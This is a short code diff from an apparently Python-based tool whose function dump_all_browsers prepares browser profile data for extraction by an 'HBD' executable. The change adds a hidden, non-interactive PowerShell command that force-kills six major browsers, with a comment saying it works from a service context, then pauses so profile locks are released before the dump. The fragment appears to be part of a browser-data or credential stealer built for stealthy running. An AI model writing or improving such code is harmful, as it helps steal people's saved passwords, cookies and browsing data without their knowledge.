@@ -71,8 +71,11 @@ def dump_all_browsers():
         log.error(f"HBD exe not found: {HBD_EXE}")
         sys.exit(1)
 
-    for proc in ["chrome.exe","msedge.exe","brave.exe","firefox.exe","opera.exe","vivaldi.exe"]:
-        run_cmd(["taskkill","/f","/im",proc], timeout=5)
+    # Kill browsers via PowerShell Stop-Process (works in non-interactive/service context)
+    browser_procs = ["chrome","msedge","brave","firefox","opera","vivaldi"]
+    ps_kill = "Stop-Process -Name @('{}') -Force -ErrorAction SilentlyContinue".format("','".join(browser_procs))
+    run_cmd(["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", ps_kill], timeout=10)
+    time.sleep(3)  # Wait for browsers to fully release profile lock
 
     if BROWSER_DUMP_DIR.exists():
         shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
